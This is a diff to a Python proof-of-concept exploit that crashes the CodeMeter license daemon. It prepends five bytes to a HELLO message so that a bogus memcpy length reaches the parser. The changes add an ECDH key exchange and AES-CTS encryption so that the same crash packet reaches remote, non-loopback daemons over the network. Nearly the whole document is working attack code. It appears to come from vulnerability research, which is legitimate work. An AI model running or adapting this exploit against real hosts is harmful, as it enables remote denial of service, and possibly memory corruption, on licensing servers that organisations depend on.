@@ -6,9 +6,9 @@ originates.
 
 Important separation:
 
-1. The AES/CRC/SAMC framing below is only transport machinery. It makes the
-   daemon accept and decrypt our packet as a normal client-to-daemon SAMC
-   frame.
+1. The AES/CRC/selector/SAMC framing below is only transport machinery. In
+   loopback mode it uses selector 0xa0; in remote mode it uses ECDH init
+   followed by selector 0xa1.
 2. The actual crash trigger is only five cleartext bytes inserted before a
    normal HELLO:
 
@@ -40,6 +40,7 @@ prefix.
 from __future__ import annotations
 
 import argparse
+import hashlib
 import importlib.util
 import os
 from pathlib import Path
@@ -48,6 +49,11 @@ import struct
 import subprocess
 import sys
 import time
+import zlib
+
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives.asymmetric import ec
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 
 
 # The reduced mutation. These exact bytes came from the high-throughput
@@ -65,6 +71,8 @@ DEFAULT_PREFIX_HEX = "5e355ed6f2"
 # In the deterministic cores, this shifted word is stored at parser object
 # offset +0x68 and later appears in rbx as memcpy's length.
 EXPECTED_BAD_LEN = 0x28000010
+
+SAMC_HEADER_TAIL = bytes([0x11, 0, 1, 0, 0, 0, 0, 0])
 
 
 def load_samc(ax_fuzz: Path):
@@ -97,6 +105,128 @@ def codemeter_pid() -> int | None:
         return None
     pids = [int(tok) for tok in out.split() if tok.isdigit()]
     return pids[0] if pids else None
+
+
+def is_loopback_target(host: str) -> bool:
+    """Best-effort check used only to choose default channel/oracle behavior."""
+    return host in {"127.0.0.1", "::1", "localhost"}
+
+
+def resolve_channel(channel: str, host: str) -> str:
+    if channel != "auto":
+        return channel
+    return "psk" if is_loopback_target(host) else "ecdh"
+
+
+def recv_exact(sock: socket.socket, n: int, timeout: float) -> bytes:
+    sock.settimeout(timeout)
+    chunks = bytearray()
+    while len(chunks) < n:
+        try:
+            chunk = sock.recv(n - len(chunks))
+        except (ConnectionResetError, BrokenPipeError, socket.timeout, OSError):
+            break
+        if not chunk:
+            break
+        chunks.extend(chunk)
+    return bytes(chunks)
+
+
+def send_samc_payload(sock: socket.socket, payload: bytes) -> None:
+    """Send one outer samc envelope with the provided selector/cipher payload."""
+    header = b"samc" + struct.pack("<I", len(payload)) + SAMC_HEADER_TAIL
+    sock.sendall(header + payload)
+
+
+def recv_samc_payload(sock: socket.socket, timeout: float) -> bytes | None:
+    hdr = recv_exact(sock, 16, timeout)
+    if len(hdr) != 16 or hdr[:4] != b"samc":
+        return None
+    body_len = struct.unpack_from("<I", hdr, 4)[0]
+    if body_len > 1 << 24:
+        return None
+    body = recv_exact(sock, body_len, timeout)
+    if len(body) != body_len:
+        return None
+    return body
+
+
+def cts_swap(ciphertext: bytes) -> bytes:
+    """CodeMeter's CBC-CTS form swaps the last two complete blocks."""
+    if len(ciphertext) >= 32 and len(ciphertext) % 16 == 0:
+        return ciphertext[:-32] + ciphertext[-16:] + ciphertext[-32:-16]
+    return ciphertext
+
+
+def derive_ecdh_key_iv(shared: bytes) -> tuple[bytes, bytes]:
+    digest = hashlib.sha256(shared + b"\x00\x00\x00\x01").digest()
+    return digest[:16], digest[16:32]
+
+
+def do_ecdh_handshake(sock: socket.socket, timeout: float) -> tuple[bytes, bytes, bytes]:
+    """Run the remote-accepted ECDH selector exchange and return key/iv."""
+    private_key = ec.generate_private_key(ec.SECP224R1(), default_backend())
+    public_numbers = private_key.public_key().public_numbers()
+    client_point = (
+        b"\x04"
+        + public_numbers.x.to_bytes(28, "big")
+        + public_numbers.y.to_bytes(28, "big")
+    )
+
+    send_samc_payload(sock, b"\xa2\x05" + client_point)
+    response = recv_samc_payload(sock, timeout)
+    if response is None:
+        raise ConnectionError("no ECDH response")
+    if len(response) < 65:
+        raise ConnectionError(f"short ECDH response: {len(response)} bytes")
+    if response[8] != 0x04:
+        raise ConnectionError(f"unexpected ECDH point marker: 0x{response[8]:02x}")
+
+    server_x = int.from_bytes(response[9:37], "big")
+    server_y = int.from_bytes(response[37:65], "big")
+    server_public = ec.EllipticCurvePublicNumbers(
+        server_x, server_y, ec.SECP224R1(),
+    ).public_key(default_backend())
+    shared = private_key.exchange(ec.ECDH(), server_public)
+    key, iv = derive_ecdh_key_iv(shared)
+    return key, iv, response
+
+
+def build_ecdh_mac_suffix(plaintext: bytes) -> bytes:
+    """Append the ECDH-channel length/CRC tail around arbitrary app bytes.
+
+    Unlike the loopback PSK path, the ECDH channel CRC covers the padded
+    plaintext plus the data_len field, i.e. every byte except the CRC itself.
+    """
+    aligned = ((len(plaintext) + 16) + 15) & ~15
+    if aligned < 32:
+        aligned = 32
+    pad_len = aligned - len(plaintext) - 8
+    body = plaintext + (b"\x00" * pad_len) + struct.pack("<I", len(plaintext))
+    return body + struct.pack("<I", zlib.crc32(body) & 0xFFFFFFFF)
+
+
+def encrypt_ecdh_payload(plaintext: bytes, key: bytes, iv: bytes) -> bytes:
+    full_plaintext = build_ecdh_mac_suffix(plaintext)
+    encryptor = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
+    ciphertext = encryptor.update(full_plaintext) + encryptor.finalize()
+    return b"\xa1" + cts_swap(ciphertext)
+
+
+def decrypt_ecdh_response(payload: bytes | None, key: bytes, iv: bytes) -> bytes | None:
+    if payload is None or len(payload) < 16 or len(payload) % 16 != 0:
+        return None
+    decryptor = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
+    plaintext = decryptor.update(cts_swap(payload)) + decryptor.finalize()
+    if len(plaintext) < 8:
+        return None
+    data_len = struct.unpack_from("<I", plaintext, len(plaintext) - 8)[0]
+    crc = struct.unpack_from("<I", plaintext, len(plaintext) - 4)[0]
+    if data_len > len(plaintext) - 8:
+        return None
+    if (zlib.crc32(plaintext[:-4]) & 0xFFFFFFFF) != crc:
+        return None
+    return plaintext[:data_len]
 
 
 def newest_core() -> tuple[str, int, int] | None:
@@ -145,7 +275,7 @@ def print_plaintext_explanation(canonical_hello: bytes, mutated_hello: bytes,
         print(f"matches_expected_bad_len={words[3] == EXPECTED_BAD_LEN}")
     print()
     print("Interpretation:")
-    print("  The daemon decrypts this as a valid SAMC HELLO plaintext.")
+    print("  The daemon decrypts this as the application HELLO plaintext.")
     print("  The 5-byte prefix shifts the normal HELLO fields.")
     print("  The shifted u32 at cleartext offset 0x0c is 0x28000010.")
     print("  In confirmed cores, the parser stores that value at this+0x68.")
@@ -157,21 +287,34 @@ def main() -> int:
     ap = argparse.ArgumentParser(
         description="Send the deterministic prefixed-HELLO crash packet.",
         formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog="""\
-Crash origin, in one line:
+        epilog=r"""Crash origin, in one line:
   prefixing HELLO with 5e355ed6f2 makes the parser see u32 0x28000010
   at the field that is later copied into this+0x68 and used as memcpy length.
 
-This sends only one frame: the mutated HELLO. It does not send ACK or 0x64.
+After any required channel setup, this sends only one application frame:
+the mutated HELLO. It does not send ACK or 0x64.
+
+For remote/non-loopback targets, --channel auto sends the same mutated
+application plaintext over the ECDH-selected channel:
+  samc(\xa2\x05 + P-224 point) -> derive key/iv -> samc(\xa1 + ciphertext)
 """,
     )
     ap.add_argument("--ax-fuzz", default="/home/avj/clones/ax_fuzz")
     ap.add_argument("--host", default="127.0.0.1")
     ap.add_argument("--port", type=int, default=22350)
+    ap.add_argument("--channel", choices=["auto", "psk", "ecdh"], default="auto",
+                    help="crypto channel: auto uses PSK for loopback, ECDH otherwise")
     ap.add_argument("--prefix", default=DEFAULT_PREFIX_HEX,
                     help="hex bytes to insert before the canonical HELLO")
+    ap.add_argument("--connect-timeout", type=float, default=2.0)
+    ap.add_argument("--socket-timeout", type=float, default=2.0)
     ap.add_argument("--wait", type=float, default=10.0)
+    ap.add_argument("--dry-run", action="store_true",
+                    help="build and explain the mutated plaintext but do not connect")
+    ap.add_argument("--no-crash-oracle", action="store_true",
+                    help="do not inspect the local CodeMeter PID/core state")
     args = ap.parse_args()
+    channel = resolve_channel(args.channel, args.host)
 
     # Load captured plaintexts and crypto helpers from ax_fuzz. This is not
     # where the vulnerability is; it just gives us a correctly encrypted SAMC
@@ -180,8 +323,9 @@ This sends only one frame: the mutated HELLO. It does not send ACK or 0x64.
 
     # Crash oracle baseline. If the PID changes/disappears or a newer core
     # appears after sending the packet, we count the reproduction as successful.
-    before_pid = codemeter_pid()
-    before_core = newest_core()
+    local_crash_oracle = not args.no_crash_oracle and is_loopback_target(args.host)
+    before_pid = codemeter_pid() if local_crash_oracle else None
+    before_core = newest_core() if local_crash_oracle else None
 
     # CodeMeter rejects replayed HELLO tokens. Refresh the token so the mutated
     # HELLO still reaches the parser instead of being discarded as a replay.
@@ -197,38 +341,79 @@ This sends only one frame: the mutated HELLO. It does not send ACK or 0x64.
     mutated_hello = prefix + canonical_hello
 
     print("=== daemon baseline ===")
+    print(f"target={args.host}:{args.port}")
+    print(f"channel={channel}")
+    print(f"local_crash_oracle={local_crash_oracle}")
     print(f"before_pid={before_pid}")
     print(f"before_core={before_core}")
     print()
     print_plaintext_explanation(canonical_hello, mutated_hello, prefix, token)
+    if args.dry_run:
+        print("dry_run=True")
+        return 0
 
-    # Build a TCP connection to the live daemon. The daemon normally listens on
-    # localhost:22350 unless configured as a network server.
+    # Build a TCP connection to the live daemon. Remote/non-loopback peers must
+    # use the ECDH-selected channel; the time-derived PSK channel is accepted
+    # only from loopback.
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.settimeout(2.0)
+    sock.settimeout(args.connect_timeout)
     sock.connect((args.host, args.port))
+    sock.settimeout(args.socket_timeout)
     try:
-        # encrypt_c2d_frame appends the SAMC CRC/length tail, encrypts with the
-        # time-derived AES key/IV, wraps it in the "samc" wire header, and adds
-        # the client-to-daemon opcode byte. This preserves valid transport
-        # framing; the parser bug is in the decrypted plaintext content above.
-        wire = samc.encrypt_c2d_frame(mutated_hello, int(time.time()))
-        print("=== send ===")
-        print(f"wire_len={len(wire)}")
-        print("sending exactly one mutated HELLO frame")
-        sock.sendall(wire)
-        try:
-            # A crashing run usually has no response: the daemon dies while
-            # processing the HELLO. If a response appears, print it for
-            # diagnostics and let the PID/core oracle below decide success.
-            resp = samc.recv_one_wire_frame(sock, timeout=2.0)
-            inner = samc.decrypt_d2c_frame(resp, int(time.time())) if resp else None
-            print(f"response_wire_len={None if resp is None else len(resp)}")
-            print(f"response_inner_len={None if inner is None else len(inner)}")
-        except Exception as exc:
-            print(f"recv_exception={type(exc).__name__}:{exc}")
+        if channel == "psk":
+            # encrypt_c2d_frame appends the loopback PSK CRC/length tail,
+            # encrypts with the time-derived AES key/IV, wraps it in the
+            # "samc" wire header, and adds selector 0xa0.
+            wire = samc.encrypt_c2d_frame(mutated_hello, int(time.time()))
+            print("=== send ===")
+            print("selector=0xa0")
+            print(f"wire_len={len(wire)}")
+            print("sending exactly one mutated HELLO frame")
+            sock.sendall(wire)
+            try:
+                # A crashing run usually has no response: the daemon dies while
+                # processing the HELLO. If a response appears, print it for
+                # diagnostics and let the PID/core oracle below decide success.
+                resp = samc.recv_one_wire_frame(sock, timeout=args.socket_timeout)
+                inner = samc.decrypt_d2c_frame(resp, int(time.time())) if resp else None
+                print(f"response_wire_len={None if resp is None else len(resp)}")
+                print(f"response_inner_len={None if inner is None else len(inner)}")
+            except Exception as exc:
+                print(f"recv_exception={type(exc).__name__}:{exc}")
+        elif channel == "ecdh":
+            key, iv, ecdh_response = do_ecdh_handshake(sock, args.socket_timeout)
+            payload = encrypt_ecdh_payload(mutated_hello, key, iv)
+            print("=== ecdh ===")
+            print(f"server_point={ecdh_response[8:65].hex()}")
+            print(f"key={key.hex()}")
+            print(f"iv={iv.hex()}")
+            print()
+            print("=== send ===")
+            print("selector=0xa1")
+            print(f"wire_len={16 + len(payload)}")
+            print(f"encrypted_payload_len={len(payload)}")
+            print("sending exactly one ECDH-channel mutated HELLO frame")
+            send_samc_payload(sock, payload)
+            try:
+                response_payload = recv_samc_payload(sock, args.socket_timeout)
+                response_inner = decrypt_ecdh_response(response_payload, key, iv)
+                print(f"response_payload_len={None if response_payload is None else len(response_payload)}")
+                print(f"response_inner_len={None if response_inner is None else len(response_inner)}")
+                if response_inner is not None:
+                    print(f"response_inner_head={response_inner[:64].hex()}")
+            except Exception as exc:
+                print(f"recv_exception={type(exc).__name__}:{exc}")
+        else:
+            raise AssertionError(f"unexpected channel: {channel}")
     finally:
         sock.close()
+
+    if not local_crash_oracle:
+        print()
+        print("=== crash oracle ===")
+        print("local_crash_oracle=False")
+        print("No local PID/core check was run for this target.")
+        return 0
 
     deadline = time.time() + args.wait
     while time.time() < deadline:
